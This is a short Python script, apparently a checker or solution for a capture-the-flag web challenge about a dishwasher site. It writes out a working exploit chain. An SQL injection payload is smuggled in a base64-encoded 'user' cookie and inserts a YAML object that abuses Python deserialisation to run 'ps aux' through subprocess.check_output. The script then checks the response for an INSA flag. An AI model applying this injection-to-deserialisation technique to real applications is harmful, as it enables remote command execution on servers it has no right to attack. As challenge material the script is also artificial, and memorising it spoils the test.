#!/usr/bin/python3
import requests, random, string
from base64 import b64encode

url = "https://dishwashers.insecurity-insa.fr"

def random_str():
    return ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])


def alive():
    return "dishwasher" in requests.get(url).text


def exploitable():
    data = {
        "name": "aa",
        "brand": "aa",
        "cost": 123,
        "cve": "CVE-2017-7240"
    }
    the_id = "mysuperid" + random_str()
    exploit = "!!python/object:src.DishWasher {brand: AA, cost: 10, cve: AA, id: " + the_id + ", name: !!python/object/apply:subprocess.check_output [[\\'ps\\', \\'aux\\']]}\\n"
    payload = "aa aaa'), ('" + the_id + "', '" + exploit + "', 'me"
    payload = "hey', '" + the_id + "', '" + exploit + "'), ('aaa"
    cookies = {
        "user": b64encode(payload.encode("utf-8")).decode('utf-8')
    }
    res = requests.post(url + '/add_dishwasher', data=data, cookies=cookies, allow_redirects=False)
    res = requests.get(url + '/dishwasher/' + the_id)
    return "INSA{" in res.text


if __name__ == "__main__":
    print(alive() and exploitable())
